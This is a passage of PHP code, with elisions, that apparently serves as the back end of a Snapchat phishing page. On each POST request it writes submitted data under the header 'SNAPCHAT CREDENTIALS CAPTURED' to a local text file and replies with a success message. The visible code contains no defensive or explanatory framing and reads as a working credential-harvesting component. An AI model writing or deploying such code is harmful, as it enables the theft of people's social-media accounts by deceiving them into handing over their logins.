...
if($_SERVER['REQUEST_METHOD'] == "POST"){
    ...
    $formattedData = "=== SNAPCHAT CREDENTIALS CAPTURED ===\n";
    ...
    file_put_contents("snapchat_credentials.txt", $formattedData, FILE_APPEND | LOCK_EX);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Snapchat credentials saved successfully']);
} else {
    header('Content-Type: application/json');
